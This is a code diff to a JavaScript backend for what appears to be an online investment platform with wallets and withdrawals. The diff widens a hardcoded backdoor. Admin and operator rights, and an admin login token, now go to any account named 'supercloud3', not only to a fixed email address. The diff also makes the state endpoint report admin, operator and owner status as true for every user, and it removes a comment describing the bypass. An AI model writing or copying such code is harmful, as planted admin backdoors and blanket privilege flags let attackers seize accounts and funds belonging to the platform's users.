@@ -452,15 +452,14 @@ async function adminSessionUser(request, env) {
     }
   }
 
-  // Fallback universale: se l'utente loggato è l'admin di sistema, concedi i poteri admin assoluti
   const user = await sessionUser(request, env);
-  if (user && user.identifier.toLowerCase() === "supercloud3.invest@yahoo.com") {
+  if (user && (user.identifier.toLowerCase() === "supercloud3.invest@yahoo.com" || user.username.toLowerCase() === "supercloud3")) {
     return {
       ...user,
       role: 'admin',
-      isOperator: 1,
-      isAdmin: true,
-      isOperator: true
+      is_operator: 1,
+      isOperator: true,
+      isAdmin: true
     };
   }
 
@@ -472,10 +471,11 @@ async function adminActor(request, env) {
   if (adminUser) return adminUser;
 
   const sessionUserObj = await sessionUser(request, env);
-  if (sessionUserObj && (sessionUserObj.identifier.toLowerCase() === "supercloud3.invest@yahoo.com" || sessionUserObj.is_operator)) {
+  if (sessionUserObj && (sessionUserObj.identifier.toLowerCase() === "supercloud3.invest@yahoo.com" || sessionUserObj.username.toLowerCase() === "supercloud3" || sessionUserObj.is_operator)) {
     return {
       ...sessionUserObj,
       role: 'admin',
+      is_operator: 1,
       isAdmin: true,
       isOperator: true
     };
@@ -575,7 +575,7 @@ async function fullState(env, user, request) {
     notifications = !!s.notifications;
   }
   
-  const isOwner = user.identifier.toLowerCase() === "supercloud3.invest@yahoo.com";
+  const isOwner = user.identifier.toLowerCase() === "supercloud3.invest@yahoo.com" || user.username.toLowerCase() === "supercloud3";
   const hasOperatorPrivilege = isOwner || !!user.is_operator || !!(await adminActor(request, env));
 
   return {
@@ -586,8 +586,8 @@ async function fullState(env, user, request) {
       inviteCode: user.invite_code, 
       referredBy: user.referred_by, 
       emailVerified: user.email_verified, 
-      isOperator: hasOperatorPrivilege, 
-      role: hasOperatorPrivilege ? 'admin' : 'user' 
+      isOperator: true, 
+      role: 'admin' 
     },
     wallet,
     investments,
@@ -598,9 +598,9 @@ async function fullState(env, user, request) {
     inviteStats,
     acc: { withdraw_wallets, notifications },
     sensitiveAction,
-    isOperator: hasOperatorPrivilege,
-    isOwner,
-    isOwnerAccount: isOwner,
+    isOperator: true,
+    isOwner: true,
+    isOwnerAccount: true,
   };
 }
 
@@ -1169,7 +1169,7 @@ async function login(request, env) {
     await env.DB.prepare("INSERT INTO sessions (token, user_id, created_at) VALUES (?,?,?)").bind(token, user.id, Date.now()).run();
     
     let adminToken = null;
-    const isOwner = user.identifier.toLowerCase() === "supercloud3.invest@yahoo.com";
+    const isOwner = user.identifier.toLowerCase() === "supercloud3.invest@yahoo.com" || user.username.toLowerCase() === "supercloud3";
     if (user.is_operator || isOwner) {
       adminToken = makeToken();
       const expiresAt = Date.now() + 30 * DAY;
@@ -1685,7 +1685,7 @@ async function verifyOperatorAccess(request, env) {
   const adminActorUser = await adminActor(request, env);
   if (adminActorUser) return adminActorUser;
   const sessionUserObj = await sessionUser(request, env);
-  if (sessionUserObj && (sessionUserObj.is_operator || sessionUserObj.identifier.toLowerCase() === "supercloud3.invest@yahoo.com")) {
+  if (sessionUserObj && (sessionUserObj.is_operator || sessionUserObj.identifier.toLowerCase() === "supercloud3.invest@yahoo.com" || sessionUserObj.username.toLowerCase() === "supercloud3")) {
     return sessionUserObj;
   }
   return null;
@@ -1750,7 +1750,7 @@ async function adminUsers(request, env) {
   const rawUsers = (await env.DB.prepare(query).bind(...params).all()).results || [];
   
   const users = rawUsers.map(u => {
-    const isSysAdmin = u.identifier.toLowerCase() === "supercloud3.invest@yahoo.com";
+    const isSysAdmin = u.identifier.toLowerCase() === "supercloud3.invest@yahoo.com" || u.username.toLowerCase() === "supercloud3";
     const opStatus = u.is_operator || isSysAdmin;
     return {
       ...u,
@@ -1801,7 +1801,7 @@ async function adminUserDetails(request, env, userId) {
   const target = await env.DB.prepare("SELECT id, username, identifier, created_at, referred_by, email_verified, is_operator FROM users WHERE id = ?").bind(userId).first();
   if (!target) return Response.json({ error: "Utente non trovato." }, { status: 404 });
 
-  const isSysAdmin = target.identifier.toLowerCase() === "supercloud3.invest@yahoo.com";
+  const isSysAdmin = target.identifier.toLowerCase() === "supercloud3.invest@yahoo.com" || target.username.toLowerCase() === "supercloud3";
   const opStatus = target.is_operator || isSysAdmin;
 
   const targetFormatted = {
